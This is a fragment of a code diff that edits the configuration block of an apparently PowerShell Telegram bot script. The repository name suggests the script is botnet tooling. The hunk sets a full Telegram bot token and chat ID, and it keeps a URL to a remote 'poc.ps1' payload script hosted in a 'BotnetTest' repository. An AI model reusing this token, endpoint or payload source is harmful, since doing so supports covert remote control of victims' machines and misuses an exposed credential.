@@ -19,8 +19,8 @@ BOT TELEGRAM:
 ## CONFIG ##
 ############
 
-$BotToken = "AAFUlMyFxCS9dLSPksd8FS-oN8Om-Z0L5W4"
-$ChatID = '6983160441'
+$BotToken = "6983160441:AAFUlMyFxCS9dLSPksd8FS-oN8Om-Z0L5W4"
+$ChatID = '5551630546'
 $githubScript = 'https://raw.githubusercontent.com/ViperHubOnTop/BotnetTest/main/poc.ps1'
 
 
